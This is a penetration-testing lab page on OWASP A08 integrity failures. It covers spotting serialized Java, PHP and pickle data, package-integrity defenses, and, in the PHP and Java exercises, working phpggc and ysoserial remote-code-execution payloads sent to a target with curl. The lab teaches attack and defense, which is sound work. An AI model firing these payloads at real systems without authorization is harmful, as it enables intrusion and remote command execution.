---
title: A08 — Software & Data Integrity Failures
sidebar_position: 8
tags: [lab, owasp-a08, deserialization, java, php]
---

# A08 — Software & Data Integrity Failures

## What this lab covers

- Detecting serialized data — identifying Java, PHP, and Python serialized objects in request/response
- PHP deserialization — object injection and phpggc gadget chains
- Java deserialization — ysoserial exploit generation
- Package integrity verification — defense-side checks

## Configuration

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
```

## Exercise 1: Detecting Serialized Data

Serialized data in cookies, parameters, or request bodies is a signal to investigate for deserialization vulnerabilities.

### Java serialized objects

Magic bytes: `rO0AB` (base64 encoding of the Java serialization header `0xACED0005`)

```bash
# Check cookies and response bodies for Java serialization magic bytes
curl -sI "$TARGET" | grep -i "cookie" | grep -oP "[A-Za-z0-9+/=]{20,}" | while read TOKEN; do
  DECODED=$(echo "$TOKEN" | base64 -d 2>/dev/null | xxd | head -1)
  if echo "$DECODED" | grep -q "aced 0005"; then
    echo "[JAVA SERIALIZED OBJECT] Found in token: $TOKEN"
  fi
done
```

### PHP serialization format

PHP serialized objects follow the pattern `O:N:"ClassName":{properties}`:

```
O:4:"User":{2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"guest";}}
```

```bash
curl -s "$TARGET" | grep -oP 'O:[0-9]+:"[^"]+"\{.+?\}' | head -5
```

### Python pickle opcodes

Python pickles start with `\x80\x02` through `\x80\x05`:

```bash
curl -s "$TARGET/api/data" | xxd | grep -E "^[0-9a-f]+: 80 0[2-5]"
```

## Exercise 2: PHP Deserialization

### Object injection concept

If a PHP application unserializes user-controlled input, and the codebase contains classes with magic methods (`__wakeup`, `__destruct`, `__toString`) that perform dangerous operations, the magic methods execute automatically upon deserialization.

### phpggc gadget chains

phpggc generates ready-to-use serialized payloads for common PHP frameworks:

```bash
# List available gadget chains
php /opt/phpggc/phpggc --list

# Laravel RCE gadget chain — execute a command
php /opt/phpggc/phpggc Laravel/RCE1 system 'id' | base64

# Symfony file write
php /opt/phpggc/phpggc Symfony/RCE4 system 'id' | base64

# Send the payload
PAYLOAD=$(php /opt/phpggc/phpggc Laravel/RCE1 system 'id' | base64)
curl -s "$TARGET/api/data" --cookie "session=$PAYLOAD"
```

Supported frameworks include: Laravel, Symfony, Yii, Zend, Magento, WordPress, Drupal, Guzzle, Monolog.

## Exercise 3: Java Deserialization

### ysoserial gadget chain generation

```bash
# List available gadget chains
java -jar /opt/ysoserial.jar

# Generate a payload — CommonsCollections1 (common in older apps)
java -jar /opt/ysoserial.jar CommonsCollections1 'id' | base64 -w 0

# Other common gadget chains
java -jar /opt/ysoserial.jar CommonsCollections2 'whoami' | base64 -w 0
java -jar /opt/ysoserial.jar Spring1 'id' | base64 -w 0
java -jar /opt/ysoserial.jar JBoss1 'id' | base64 -w 0
```

### Send payload to a Java endpoint

```bash
PAYLOAD=$(java -jar /opt/ysoserial.jar CommonsCollections1 'id' 2>/dev/null | base64 -w 0)

curl -s -X POST "$TARGET/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  -d "$PAYLOAD"
```

Available gadget chains: CommonsCollections1–7, Spring1–2, JBoss1–6, Hibernate, Groovy, BeanShell.

## Exercise 4: Package Integrity (Defense)

### SHA-256 file verification

Always verify downloaded binaries against published checksums:

```bash
# Download a file and its checksum
wget https://example.com/tool.tar.gz
wget https://example.com/tool.tar.gz.sha256

# Verify
sha256sum -c tool.tar.gz.sha256
```

### npm — use lockfile for reproducible installs

```bash
# npm ci installs exactly what's in package-lock.json, no resolution
npm ci
```

Using `npm install` in CI allows dependency resolution to pull in newer (potentially compromised) versions.

### Subresource Integrity (SRI) for browser scripts

When loading third-party scripts in HTML, always include an `integrity` attribute:

```html
<script
  src="https://cdn.example.com/library.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

If the CDN is compromised and the file changes, browsers will refuse to execute it. Generate SRI hashes at [srihash.org](https://www.srihash.org/).
